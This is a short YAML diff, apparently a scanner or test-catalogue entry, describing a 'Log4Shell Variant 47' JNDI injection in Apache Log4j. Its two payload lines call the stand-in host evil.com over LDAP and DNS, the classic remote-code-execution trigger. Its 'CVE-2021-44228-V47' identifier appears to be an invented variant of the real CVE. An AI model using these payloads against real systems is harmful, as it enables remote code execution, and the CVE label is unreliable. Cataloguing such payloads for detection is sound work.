@@ -1,0 +1,8 @@
+cve: CVE-2021-44228-V47
+description: JNDI injection in Apache Log4j allowing RCE via crafted log messages.
+name: Log4Shell Variant 47
+payloads:
+- ${jndi:ldap://evil.com/a}
+- ${jndi:dns://evil.com/a}
+severity: critical
+type: rce
